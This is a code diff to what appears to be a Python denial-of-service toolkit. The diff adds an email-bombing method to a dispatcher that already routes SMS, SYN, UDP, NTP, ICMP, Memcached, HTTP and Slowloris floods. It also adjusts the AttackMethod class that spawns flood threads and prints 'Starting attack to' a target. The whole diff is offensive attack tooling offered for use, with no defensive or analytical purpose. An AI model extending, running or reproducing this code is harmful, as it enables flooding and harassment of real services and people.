@@ -12,6 +12,8 @@ from tools.ipTools import GetTargetAddress, InternetConnectionCheck
 def GetMethodByName(method):
     if method == "SMS":
         dir = "tools.SMS.main"
+    elif method == "EMAIL":
+        dir = "tools.EMAIL.main"
     elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
         dir = f"tools.L4.{method.lower()}"
     elif method in ("HTTP", "SLOWLORIS"):
@@ -40,6 +42,7 @@ class AttackMethod:
         self.name = name
         self.duration = duration
         self.threads_count = threads
+        self.target_name = target
         self.target = target
         self.threads = []
         self.is_running = False
@@ -48,7 +51,7 @@ class AttackMethod:
     def __enter__(self):
         InternetConnectionCheck()
         self.method = GetMethodByName(self.name)
-        self.target = GetTargetAddress(self.target, self.name)
+        self.target = GetTargetAddress(self.target_name, self.name)
         return self
 
     # Exit
@@ -74,6 +77,9 @@ class AttackMethod:
         # Run timer thread
         thread = Thread(target=self.__RunTimer)
         thread.start()
+        # Check if 1 thread
+        if self.name == "EMAIL":
+            self.threads_count = 1
         # Create flood threads
         for _ in range(self.threads_count):
             thread = Thread(target=self.__RunFlood)
@@ -95,7 +101,10 @@ class AttackMethod:
 
     # Start ddos attack
     def Start(self):
-        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
+        if self.name == "EMAIL":
+            target = self.target_name
+        else:
+            target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
             f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using method {self.name}.{Fore.RESET}\n"
